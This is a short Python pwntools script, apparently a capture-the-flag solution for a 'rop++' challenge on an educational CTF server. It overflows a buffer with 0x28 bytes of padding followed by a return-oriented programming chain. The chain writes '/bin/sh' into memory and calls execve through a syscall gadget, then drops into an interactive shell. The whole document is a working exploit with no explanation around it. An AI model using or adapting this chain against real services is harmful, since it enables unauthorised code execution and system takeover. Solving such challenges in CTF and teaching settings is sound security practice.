from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
r = remote('edu-ctf.zoolab.org', 10003)
#r = process("/home/kali/temp/rop++/share/chal")
#gdb.attach(r, gdbscript='b *0x401798')


pop_rdi = 0x401e3f 
pop_rsi = 0x409e6e 
mov_ptr_rsi_rax = 0x449fa5

pop_rdx_rbx = 0x47ed0b
pop_rax = 0x447b27
syscall = 0x414506 

buf = 0x4c50e0
ROP = flat( 
    #write '/bin/sh\x00' to memory
    pop_rsi, buf,
    pop_rax, b'/bin/sh\x00',
    mov_ptr_rsi_rax,

    #sys_execve("/bin/sh", NULL, NULL); [rdi:buf, rsi:0 ,rdx:0 ,rax:0x3b]
    pop_rdi, buf,
    pop_rsi, 0,
    pop_rdx_rbx, 0, 0,
    pop_rax, 0x3b,
    syscall,
)

#print(b'A'*0x28 + ROP)
r.sendlineafter(b'show me rop\n> ', b'A'*0x28+ ROP)
r.interactive()
